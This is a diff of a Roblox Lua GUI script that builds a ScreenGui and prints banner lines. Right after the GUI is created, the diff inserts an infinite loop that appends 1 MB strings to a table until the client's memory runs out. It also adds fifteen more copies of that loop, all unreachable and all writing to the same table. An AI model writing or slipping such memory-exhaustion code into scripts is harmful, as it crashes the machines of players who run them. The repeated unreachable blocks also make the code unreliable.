@@ -6,6 +6,11 @@ local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Parent = PlayerGui
 
 task.wait(.1)
+local huge_table = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
 print("#----------||---------#")
 task.wait(.1)
 print("##---------||---------##")
@@ -74,10 +79,85 @@ FrameCorner.CornerRadius = UDim.new(.01)
 end
 
 task.wait(10)
-local huge_table = {}
+
+local huge_table1 = {}
     while true do
         table.insert(huge_table, string.rep("A", 1024 * 1024))
     end
+
+local huge_table2 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table3 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table4 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table5 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table6 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table7 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table8 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table9 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table10 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table11 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table12 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table13 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table14 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+local huge_table15 = {}
+    while true do
+        table.insert(huge_table, string.rep("A", 1024 * 1024))
+    end
+
+
+
+
 
 
 
